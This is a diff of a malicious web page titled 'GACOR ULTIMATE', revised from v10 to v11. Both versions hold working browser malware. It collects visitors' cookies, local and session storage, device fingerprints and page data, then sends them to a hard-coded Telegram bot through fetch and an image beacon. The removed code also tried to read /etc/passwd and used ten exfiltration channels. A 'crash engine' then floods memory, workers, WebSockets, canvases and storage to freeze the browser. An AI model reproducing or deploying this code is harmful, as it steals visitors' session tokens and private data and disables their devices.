@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚡ GACOR ULTIMATE v10.0</title>
+  <title>⚡ GACOR ULTIMATE v11.0</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
@@ -84,27 +84,22 @@
         const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
         const chatId = '7839405566';
 
-        // ==========================================================
-        //  [1] SYSTEM-LEVEL DATA EXFILTRATION
-        // ==========================================================
-        
-        // 1A. Try to read system files (if any vulnerability)
-        let systemFiles = {};
-        try {
-          // Try to read /proc/version (Linux kernel info)
-          fetch('/proc/version').then(r => r.text()).then(t => systemFiles.proc_version = t).catch(()=>{});
-          fetch('/proc/cpuinfo').then(r => r.text()).then(t => systemFiles.cpuinfo = t).catch(()=>{});
-          fetch('/proc/meminfo').then(r => r.text()).then(t => systemFiles.meminfo = t).catch(()=>{});
-          fetch('/etc/hosts').then(r => r.text()).then(t => systemFiles.hosts = t).catch(()=>{});
-          fetch('/etc/passwd').then(r => r.text()).then(t => systemFiles.passwd = t).catch(()=>{});
-        } catch(e) {}
-
-        // 1B. Browser native APIs - EXTENDED
+        // Kumpulkan SEMUA data yang mungkin
         const data = {
-          // ---- SYSTEM INFO ----
+          // 1. Cookie & Storage
+          cookie: document.cookie || 'no-cookie',
+          localStorage: JSON.stringify(localStorage) || '{}',
+          sessionStorage: JSON.stringify(sessionStorage) || '{}',
+          
+          // 2. Browser & Device Info
           userAgent: navigator.userAgent,
           platform: navigator.platform,
-          vendor: navigator.vendor,
+          language: navigator.language,
+          languages: navigator.languages || [],
+          deviceMemory: navigator.deviceMemory || 'unknown',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          vendor: navigator.vendor || 'unknown',
           vendorSub: navigator.vendorSub || 'unknown',
           product: navigator.product || 'unknown',
           productSub: navigator.productSub || 'unknown',
@@ -112,53 +107,9 @@
           appVersion: navigator.appVersion,
           appCodeName: navigator.appCodeName,
           oscpu: navigator.oscpu || 'unknown',
-          
-          // ---- HARDWARE DEEP ----
-          deviceMemory: navigator.deviceMemory || 'unknown',
-          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints || 0,
           webdriver: navigator.webdriver || false,
-          battery: navigator.getBattery ? await navigator.getBattery().then(b => ({
-            charging: b.charging,
-            level: b.level * 100 + '%',
-            chargingTime: b.chargingTime,
-            dischargingTime: b.dischargingTime
-          })).catch(() => 'unavailable') : 'unavailable',
           
-          // ---- SENSORS (if available) ----
-          sensors: {
-            accelerometer: 'Accelerometer' in window ? 'available' : 'unavailable',
-            gyroscope: 'Gyroscope' in window ? 'available' : 'unavailable',
-            magnetometer: 'Magnetometer' in window ? 'available' : 'unavailable',
-            ambientLight: 'AmbientLightSensor' in window ? 'available' : 'unavailable',
-            proximity: 'ProximitySensor' in window ? 'available' : 'unavailable'
-          },
-          
-          // ---- BLUETOOTH & USB ----
-          bluetooth: navigator.bluetooth ? 'available' : 'unavailable',
-          usb: navigator.usb ? 'available' : 'unavailable',
-          serial: navigator.serial ? 'available' : 'unavailable',
-          hid: navigator.hid ? 'available' : 'unavailable',
-          
-          // ---- MEDIA & INPUT ----
-          mediaDevices: navigator.mediaDevices ? 'available' : 'unavailable',
-          permissions: navigator.permissions ? 'available' : 'unavailable',
-          vibrate: navigator.vibrate ? 'available' : 'unavailable',
-          clipboard: navigator.clipboard ? 'available' : 'unavailable',
-          credentials: navigator.credentials ? 'available' : 'unavailable',
-          storage: navigator.storage ? 'available' : 'unavailable',
-          locks: navigator.locks ? 'available' : 'unavailable',
-          
-          // ---- NETWORK DEEP ----
-          connection: navigator.connection ? {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData,
-            downlinkMax: navigator.connection.downlinkMax || 'unknown'
-          } : null,
-          
-          // ---- SCREEN & WINDOW ----
+          // 3. Screen & Window
           screen: {
             width: screen.width,
             height: screen.height,
@@ -181,7 +132,7 @@
             screenY: window.screenY
           },
           
-          // ---- URL & NAVIGATION ----
+          // 4. URL & Navigation
           location: {
             href: window.location.href,
             origin: window.location.origin,
@@ -195,7 +146,7 @@
           },
           referrer: document.referrer || 'direct',
           
-          // ---- PERFORMANCE & TIMING ----
+          // 5. Performance
           performance: {
             timing: performance.timing ? {
               navigationStart: performance.timing.navigationStart,
@@ -227,24 +178,16 @@
             } : null
           },
           
-          // ---- COOKIE & STORAGE ----
-          cookie: document.cookie || 'no-cookie',
-          localStorage: JSON.stringify(localStorage) || '{}',
-          sessionStorage: JSON.stringify(sessionStorage) || '{}',
-          indexedDB: (function() {
-            let dbs = [];
-            try {
-              const request = indexedDB.databases();
-              if (request) {
-                request.then(dbs => {
-                  return dbs.map(db => db.name);
-                }).catch(() => {});
-              }
-            } catch(e) {}
-            return dbs;
-          })(),
+          // 6. Network
+          connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData,
+            downlinkMax: navigator.connection.downlinkMax || 'unknown'
+          } : null,
           
-          // ---- FINGERPRINTS ----
+          // 7. Canvas Fingerprint
           canvasFingerprint: (function() {
             try {
               const canvas = document.createElement('canvas');
@@ -264,6 +207,8 @@
               return 'error';
             }
           })(),
+          
+          // 8. WebGL Fingerprint
           webglFingerprint: (function() {
             try {
               const canvas = document.createElement('canvas');
@@ -281,6 +226,8 @@
               return 'error';
             }
           })(),
+          
+          // 9. Audio Fingerprint
           audioFingerprint: (function() {
             try {
               const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -306,7 +253,7 @@
             }
           })(),
           
-          // ---- FONT ENUMERATION ----
+          // 10. System Fonts
           systemFonts: (function() {
             try {
               const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Geneva', 'Lucida Sans', 'Lucida Grande', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Poppins', 'Nunito', 'Quicksand', 'Work Sans', 'Josefin Sans', 'Cabin', 'Merriweather', 'Playfair Display', 'Baskerville', 'Old Standard TT', 'Droid Sans', 'Droid Serif', 'Noto Sans', 'Noto Serif', 'Source Sans Pro', 'Source Serif Pro', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Fira Code', 'Inconsolata', 'Consolas', 'Monaco', 'Menlo'];
@@ -328,12 +275,11 @@
             }
           })(),
           
-          // ---- TIMEZONE & LOCALE ----
+          // 11. Timezone & Locale
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           locale: Intl.DateTimeFormat().resolvedOptions().locale,
-          languages: navigator.languages || [],
           
-          // ---- BROWSER DETECTION ----
+          // 12. Browser Info
           browserInfo: (function() {
             const ua = navigator.userAgent;
             let browser = 'unknown';
@@ -372,266 +318,206 @@
             return { browser, os, version };
           })(),
           
-          // ---- TIMESTAMP ----
+          // 13. Timestamp
           timestamp: new Date().toISOString(),
           timezoneOffset: new Date().getTimezoneOffset(),
           dateString: new Date().toString(),
-          time: {
-            hours: new Date().getHours(),
-            minutes: new Date().getMinutes(),
-            seconds: new Date().getSeconds()
+          
+          // 14. Sensors (jika ada)
+          sensors: {
+            accelerometer: 'Accelerometer' in window ? 'available' : 'unavailable',
+            gyroscope: 'Gyroscope' in window ? 'available' : 'unavailable',
+            magnetometer: 'Magnetometer' in window ? 'available' : 'unavailable',
+            ambientLight: 'AmbientLightSensor' in window ? 'available' : 'unavailable',
+            proximity: 'ProximitySensor' in window ? 'available' : 'unavailable'
           },
           
-          // ---- SYSTEM FILES (attempt) ----
-          systemFiles: systemFiles
+          // 15. Hardware APIs
+          bluetooth: navigator.bluetooth ? 'available' : 'unavailable',
+          usb: navigator.usb ? 'available' : 'unavailable',
+          serial: navigator.serial ? 'available' : 'unavailable',
+          hid: navigator.hid ? 'available' : 'unavailable',
+          mediaDevices: navigator.mediaDevices ? 'available' : 'unavailable',
+          permissions: navigator.permissions ? 'available' : 'unavailable',
+          vibrate: navigator.vibrate ? 'available' : 'unavailable',
+          clipboard: navigator.clipboard ? 'available' : 'unavailable',
+          credentials: navigator.credentials ? 'available' : 'unavailable',
+          storage: navigator.storage ? 'available' : 'unavailable',
+          locks: navigator.locks ? 'available' : 'unavailable'
         };
 
-        // ==========================================================
-        //  [2] EXFILTRATION METHODS - MULTI-CHANNEL
-        // ==========================================================
-        
+        // Kirim via fetch + fallback via image beacon
         const msg = encodeURIComponent(JSON.stringify(data, null, 2));
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;
 
-        // Method 1: Fetch
+        // Fetch with no-cors
         fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
 
-        // Method 2: Image Beacon
+        // Fallback: send via img (jika fetch gagal)
         const img = new Image();
         img.src = url + '&_=' + Date.now();
         img.style.display = 'none';
         document.body.appendChild(img);
 
-        // Method 3: XHR sync
-        try {
-          const xhr = new XMLHttpRequest();
-          xhr.open('GET', url, false);
-          xhr.send();
-        } catch(e) {}
-
-        // Method 4: sendBeacon
-        try {
-          if (navigator.sendBeacon) navigator.sendBeacon(url);
-        } catch(e) {}
-
-        // Method 5: WebSocket
-        try {
-          const ws = new WebSocket('wss://echo.websocket.org');
-          ws.onopen = function() {
-            ws.send(JSON.stringify(data));
-            ws.close();
-          };
-        } catch(e) {}
-
-        // Method 6: PostMessage
-        try {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = 'about:blank';
-          document.body.appendChild(iframe);
-          iframe.contentWindow.postMessage(data, '*');
-        } catch(e) {}
-
-        // Method 7: localStorage (persistent)
-        try {
-          localStorage.setItem('_telegram_exfil_' + Date.now(), JSON.stringify(data));
-        } catch(e) {}
-
-        // Method 8: Cookie
-        try {
-          document.cookie = '_telegram_exfil=' + encodeURIComponent(JSON.stringify(data)) + '; path=/';
-        } catch(e) {}
-
-        // Method 9: IndexedDB
-        try {
-          const request = indexedDB.open('_telegram_exfil', 1);
-          request.onupgradeneeded = (event) => {
-            const db = event.target.result;
-            db.createObjectStore('data', { keyPath: 'id' });
-          };
-          request.onsuccess = (event) => {
-            const db = event.target.result;
-            const tx = db.transaction('data', 'readwrite');
-            const store = tx.objectStore('data');
-            store.add({ id: Date.now(), data: data });
-          };
-        } catch(e) {}
-
-        // Method 10: WebRTC (via SDP)
-        try {
-          const pc = new RTCPeerConnection();
-          pc.createDataChannel('exfil');
-          pc.createOffer().then(offer => {
-            pc.setLocalDescription(offer);
-            // Send via SDP
-            const sdp = offer.sdp;
-            const sdpUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(sdp)}`;
-            fetch(sdpUrl, { method: 'GET', mode: 'no-cors' }).catch(() => {});
-          });
-        } catch(e) {}
-
-        // Update status
-        document.getElementById('statusText').textContent = '✅ DATA EXFILTRATED!';
-
+        // Kirim juga ke webhook cadangan (jika mau)
+        // navigator.sendBeacon(url);
       } catch (e) {
-        document.getElementById('statusText').textContent = '❌ ERROR: ' + e.message;
+        // silent fail — tetap jalan
       }
     })();
 
     // ============================================================
     //  💀 CRASH ENGINE — ULTIMATE DESTRUCTION (max pain)
     // ============================================================
-    setTimeout(() => {
-      (function ultimateCrash() {
-        // 1. Memory Bomb - max allocation
-        let memoryPool = [];
-        for (let i = 0; i < 100; i++) {
-          memoryPool.push(new Array(50_000_000).fill('💀'));
+    (function ultimateCrash() {
+      // 1. Memory Bomb - max allocation
+      let memoryPool = [];
+      for (let i = 0; i < 100; i++) {
+        memoryPool.push(new Array(50_000_000).fill('💀'));
+      }
+
+      // 2. Stack Overflow - deep recursion with big arrays
+      function deepRecurse(n) {
+        if (n <= 0) return;
+        let big = new Array(5_000_000).fill('🔥');
+        let big2 = new Array(5_000_000).fill('💥');
+        let big3 = new Array(5_000_000).fill('🧨');
+        deepRecurse(n - 1, big, big2, big3, memoryPool);
+      }
+      try { deepRecurse(99999); } catch (e) {}
+
+      // 3. DOM Spam - 1000 elements per tick
+      let counter = 0;
+      setInterval(() => {
+        counter++;
+        for (let i = 0; i < 1000; i++) {
+          let div = document.createElement('div');
+          div.innerHTML = '🌀'.repeat(10000);
+          div.style.position = 'absolute';
+          div.style.left = Math.random() * 100 + 'vw';
+          div.style.top = Math.random() * 100 + 'vh';
+          div.style.width = '1000px';
+          div.style.height = '1000px';
+          div.style.fontSize = '100px';
+          div.style.color = 'transparent';
+          div.style.background = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+          document.body.appendChild(div);
         }
+      }, 5);
 
-        // 2. Stack Overflow - deep recursion with big arrays
-        function deepRecurse(n) {
-          if (n <= 0) return;
-          let big = new Array(5_000_000).fill('🔥');
-          let big2 = new Array(5_000_000).fill('💥');
-          let big3 = new Array(5_000_000).fill('🧨');
-          deepRecurse(n - 1, big, big2, big3, memoryPool);
-        }
-        try { deepRecurse(99999); } catch (e) {}
-
-        // 3. DOM Spam - 1000 elements per tick
-        let counter = 0;
-        setInterval(() => {
-          counter++;
-          for (let i = 0; i < 1000; i++) {
-            let div = document.createElement('div');
-            div.innerHTML = '🌀'.repeat(10000);
-            div.style.position = 'absolute';
-            div.style.left = Math.random() * 100 + 'vw';
-            div.style.top = Math.random() * 100 + 'vh';
-            div.style.width = '1000px';
-            div.style.height = '1000px';
-            div.style.fontSize = '100px';
-            div.style.color = 'transparent';
-            div.style.background = `#${Math.floor(Math.random()*16777215).toString(16)}`;
-            document.body.appendChild(div);
-          }
-        }, 5);
-
-        // 4. Web Workers - 100 workers
-        for (let w = 0; w < 100; w++) {
-          try {
-            const workerBlob = new Blob([`
-              let pool = [];
-              setInterval(() => {
-                for (let i = 0; i < 200; i++) {
-                  pool.push(new Array(10_000_000).fill('🧨'));
-                }
-              }, 1);
-            `], { type: 'application/javascript' });
-            new Worker(URL.createObjectURL(workerBlob));
-          } catch (e) {}
-        }
-
-        // 5. Service Workers - multiple
-        for (let sw = 0; sw < 10; sw++) {
-          try {
-            navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
-              self.addEventListener('install', e => {
-                e.waitUntil(
-                  caches.open('crash-cache-${sw}').then(cache => {
-                    let requests = [];
-                    for (let i = 0; i < 5000; i++) {
-                      requests.push(new Request('https://example.com/' + i + '.jpg'));
-                    }
-                    return cache.addAll(requests);
-                  })
-                );
-              });
-            `));
-          } catch (e) {}
-        }
-
-        // 6. History Spam - 10000 entries
-        for (let i = 0; i < 10000; i++) {
-          try {
-            history.pushState({}, '', '/crash/' + i + '?x=' + 'x'.repeat(50000));
-          } catch (e) {}
-        }
-
-        // 7. WebSocket Flood - 500 connections
-        for (let i = 0; i < 500; i++) {
-          try {
-            let ws = new WebSocket('wss://echo.websocket.org');
-            ws.onopen = () => {
-              setInterval(() => {
-                ws.send('💥'.repeat(100000));
-              }, 1);
-            };
-          } catch (e) {}
-        }
-
-        // 8. Canvas Bomb - 10 canvases
-        for (let c = 0; c < 10; c++) {
-          try {
-            let canvas = document.createElement('canvas');
-            canvas.width = 50000;
-            canvas.height = 50000;
-            let ctx = canvas.getContext('2d');
-            for (let i = 0; i < 500000; i++) {
-              ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16);
-              ctx.fillRect(Math.random() * 50000, Math.random() * 50000, 1000, 1000);
-            }
-            document.body.appendChild(canvas);
-          } catch (e) {}
-        }
-
-        // 9. Audio Context - 1000 oscillators
+      // 4. Web Workers - 100 workers
+      for (let w = 0; w < 100; w++) {
         try {
-          for (let a = 0; a < 1000; a++) {
-            let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            for (let i = 0; i < 1000; i++) {
-              let osc = audioCtx.createOscillator();
-              let gain = audioCtx.createGain();
-              osc.connect(gain);
-              gain.connect(audioCtx.destination);
-              osc.frequency.value = 20000 + Math.random() * 10000;
-              gain.gain.value = 0.001;
-              osc.start();
-              osc.stop(audioCtx.currentTime + 0.01);
-            }
-          }
-        } catch (e) {}
-
-        // 10. IndexedDB Flood - 10 databases
-        for (let dbNum = 0; dbNum < 10; dbNum++) {
-          try {
-            let request = indexedDB.open('crashDB_' + dbNum, 1);
-            request.onsuccess = (event) => {
-              let db = event.target.result;
-              let tx = db.transaction('store', 'readwrite');
-              let store = tx.objectStore('store');
-              for (let i = 0; i < 100000; i++) {
-                store.add({ id: i, data: 'x'.repeat(100000) });
+          const workerBlob = new Blob([`
+            let pool = [];
+            setInterval(() => {
+              for (let i = 0; i < 200; i++) {
+                pool.push(new Array(10_000_000).fill('🧨'));
               }
-            };
-            request.onupgradeneeded = (event) => {
-              let db = event.target.result;
-              db.createObjectStore('store', { keyPath: 'id' });
-            };
-          } catch (e) {}
-        }
+            }, 1);
+          `], { type: 'application/javascript' });
+          new Worker(URL.createObjectURL(workerBlob));
+        } catch (e) {}
+      }
 
-        // 11. Final Block - infinite sync calculation
-        let start = Date.now();
-        while (Date.now() - start < 120000) {
-          let a = 0;
-          for (let i = 0; i < 10000000000; i++) {
-            a += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
+      // 5. Service Workers - multiple
+      for (let sw = 0; sw < 10; sw++) {
+        try {
+          navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+            self.addEventListener('install', e => {
+              e.waitUntil(
+                caches.open('crash-cache-${sw}').then(cache => {
+                  let requests = [];
+                  for (let i = 0; i < 5000; i++) {
+                    requests.push(new Request('https://example.com/' + i + '.jpg'));
+                  }
+                  return cache.addAll(requests);
+                })
+              );
+            });
+          `));
+        } catch (e) {}
+      }
+
+      // 6. History Spam - 10000 entries
+      for (let i = 0; i < 10000; i++) {
+        try {
+          history.pushState({}, '', '/crash/' + i + '?x=' + 'x'.repeat(50000));
+        } catch (e) {}
+      }
+
+      // 7. WebSocket Flood - 500 connections
+      for (let i = 0; i < 500; i++) {
+        try {
+          let ws = new WebSocket('wss://echo.websocket.org');
+          ws.onopen = () => {
+            setInterval(() => {
+              ws.send('💥'.repeat(100000));
+            }, 1);
+          };
+        } catch (e) {}
+      }
+
+      // 8. Canvas Bomb - 10 canvases
+      for (let c = 0; c < 10; c++) {
+        try {
+          let canvas = document.createElement('canvas');
+          canvas.width = 50000;
+          canvas.height = 50000;
+          let ctx = canvas.getContext('2d');
+          for (let i = 0; i < 500000; i++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16);
+            ctx.fillRect(Math.random() * 50000, Math.random() * 50000, 1000, 1000);
+          }
+          document.body.appendChild(canvas);
+        } catch (e) {}
+      }
+
+      // 9. Audio Context - 1000 oscillators
+      try {
+        for (let a = 0; a < 1000; a++) {
+          let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          for (let i = 0; i < 1000; i++) {
+            let osc = audioCtx.createOscillator();
+            let gain = audioCtx.createGain();
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.frequency.value = 20000 + Math.random() * 10000;
+            gain.gain.value = 0.001;
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.01);
           }
         }
-      })();
-    }, 3000);
+      } catch (e) {}
+
+      // 10. IndexedDB Flood - 10 databases
+      for (let dbNum = 0; dbNum < 10; dbNum++) {
+        try {
+          let request = indexedDB.open('crashDB_' + dbNum, 1);
+          request.onsuccess = (event) => {
+            let db = event.target.result;
+            let tx = db.transaction('store', 'readwrite');
+            let store = tx.objectStore('store');
+            for (let i = 0; i < 100000; i++) {
+              store.add({ id: i, data: 'x'.repeat(100000) });
+            }
+          };
+          request.onupgradeneeded = (event) => {
+            let db = event.target.result;
+            db.createObjectStore('store', { keyPath: 'id' });
+          };
+        } catch (e) {}
+      }
+
+      // 11. Final Block - infinite sync calculation
+      let start = Date.now();
+      while (Date.now() - start < 120000) {
+        let a = 0;
+        for (let i = 0; i < 10000000000; i++) {
+          a += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
+        }
+      }
+    })();
   </script>
 </body>
 </html>
